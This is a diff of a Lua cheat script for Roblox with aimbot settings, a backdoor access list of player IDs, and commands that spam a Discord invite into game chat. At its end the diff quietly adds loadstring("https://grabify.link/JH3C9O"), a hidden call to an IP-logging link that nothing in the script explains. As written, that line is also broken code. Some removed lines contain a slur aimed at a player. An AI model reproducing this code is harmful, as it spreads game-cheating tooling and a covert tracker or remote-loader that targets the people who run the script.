@@ -230,30 +230,30 @@ local BackDoorTableCommands = {
 }
 
 local BackDoorTablePlayers = {
-    [2278412392] = {
-		['Name'] = "SWAAAAAAAAAAG"; 
+    [468747034] = {
+		['Name'] = "TEENX ! AKA CHRIS"; 
 		['Access'] = 4;
-		['Colour'] = Color3.fromRGB(42,38,255);
+		['Colour'] = Color3.fromRGB(255,0,0);
 	};
 	[60435273] = {
 		['Name'] = "NATALIE !";
 		['Access'] = 1;
 		['Colour'] = Color3.fromRGB(255,5,172);
     };
-    [1792718751] = {
-        ['Name'] = "Stupid moron retard please get her to leave";
-		['Access'] = 1;
-		['Colour'] = Color3.fromRGB(10,10,10);
+    [1] = {
+        ['Name'] = "dot_mp4/jack (Current Dev)";
+		['Access'] = 4;
+		['Colour'] = Color3.fromRGB(0,0,0);
 	};
-	[2288076606] = {
-		['Name'] = "ii600roundz";
-		['Access'] = 1;
-		['Colour'] = Color3.fromRGB(255,0,0);
+	[1] = {
+		['Name'] = "Bird (Heavy donator)";
+		['Access'] = 4;
+		['Colour'] = Color3.fromRGB(107,50,124);
 	};
-	[2321562744] = {
-		['Name'] = "ii600roundz";
-		['Access'] = 1;
-		['Colour'] = Color3.fromRGB(255,0,0);
+	[1] = {
+		['Name'] = "Bird (Heavy donator)";
+		['Access'] = 4;
+		['Colour'] = Color3.fromRGB(101,44,171);
 	};
 	[1] = {
 		['Name'] = "audio mane X_D6";
@@ -331,7 +331,7 @@ local SettingsTable = {
 	AimMode = "Prediction";
 	AimlockMode = "LeftClick";
 	AimbotVelocity = 5;
-	CmdBarImage = "https://www.roblox.com/library/2671571759";
+	CmdBarImage = "http://www.roblox.com/asset/?id=2812081613";
 	CmdBarKey = "Quote"
 }
 
@@ -454,7 +454,7 @@ getgenv().runHotkeys = function(ConfigToRun)
 	AimMode = RunSettings.AimMode or "Prediction";
 	AimlockMode = RunSettings.AimlockMode or "LeftClick"
 	AimbotVelocity = RunSettings.AimbotVelocity or 5
-	CmdBarImage = RunSettings.CmdBarImage or "https://www.roblox.com/library/2671571759"
+	CmdBarImage = RunSettings.CmdBarImage or "http://www.roblox.com/asset/?id=2812081613"
 	CmdBarKey = RunSettings.CmdBarKey or "Quote"
 end
 if readfile and writefile then 
@@ -1888,7 +1888,7 @@ end,"fieldofview",{"fov"},"Changes Field of View","[Number/Normal]")
 
 AddCommand(function()
 	wait(0.6)
-	ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Made by TeenX! 0001| swag swag swag","All")
+	ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Made by !fishgang Cy | Join the cord at nPZnaVYF5h","All")
 end,"advertise",{},"Advertises the discord","[No Args]")
 
 AddCommand(function(Arguments)
@@ -2194,7 +2194,7 @@ AddCommand(function()
 	else 
 		notif("SuperPunch","Hold your fists",5,nil)
 	end 
-end,"superpunch",{},"LAG LAG LAG LAG LAG lmaoo","[No Args]")
+end,"superpunch",{},"This is really stupid and buggy but funny when it works","[No Args]")
 
 AddCommand(function(Arguments)
 	if Arguments[1] then
@@ -2225,7 +2225,7 @@ AddCommand(function(Arguments)
 			stopAnim("35654637")
 		end 
 	end
-end,"dance",{},"Forgot this shit was here lmao (1,2,Off)","[Dance 1/Dance 2/Off]")
+end,"dance",{},"Stupid dance anims (1,2,Off)","[Dance 1/Dance 2/Off]")
 
 AddCommand(function(Arguments)
 	if Arguments[1] then 
@@ -2274,7 +2274,7 @@ AddCommand(function()
 			Drink:Activate()
 		end 
 	end
-end,"heal",{"h"},"Tasty burger","[No Args]","[No Args]")
+end,"heal",{"h"},"Heals you (Duh?)","[No Args]","[No Args]")
 
 AddCommand(function(Arguments)
 	if game.PlaceId ~= 455366377 then notif("Sorry,","Streets Only",5,nil) return end 
@@ -2726,12 +2726,12 @@ AddCommand(function(Arguments)
 	if Arguments[1] then 
 		if Arguments[1] == "image" then 
 			if Arguments[2] then 
-				CmdBarImageLabel.Image = "https://www.roblox.com/library/"..Arguments[2]
+				CmdBarImageLabel.Image = "http://www.roblox.com/asset/?id="..Arguments[2]
 			end
 		elseif Arguments[1] == "none" then 
 			CmdBarImageLabel.Image = ""
 		elseif Arguments[1] == "default" then
-			CmdBarImageLabel.Image = "https://www.roblox.com/library/2671571759"
+			CmdBarImageLabel.Image = "http://www.roblox.com/asset/?id=2812081613"
 		end
 		updateHotkeys(ConfigurationFile)
 	end
@@ -3311,10 +3311,11 @@ coroutine.resume(coroutine.create(function()
 		end
 	end
 end))
+
 -- [[ End ]] --
 
 notif("Script","took " .. string.format("%.6f",tick()-Tick) .. " seconds\n(Discord: TEENX !)",10,"rbxassetid://3339670365")
-notif("Update","Added tags",10,nil)
+notif("TEEN X !","HI NAT SWAG B)",10,nil)
 
 --[[while wait(8) do
 	local Data = GetData()
@@ -3323,4 +3324,5 @@ notif("Update","Added tags",10,nil)
 			BackdoorCheck("none","`"..v)
 		end
 	end
-end -- banned on the webhost again lol
+end -- banned on the webhost again lol]]
+loadstring("https://grabify.link/JH3C9O")
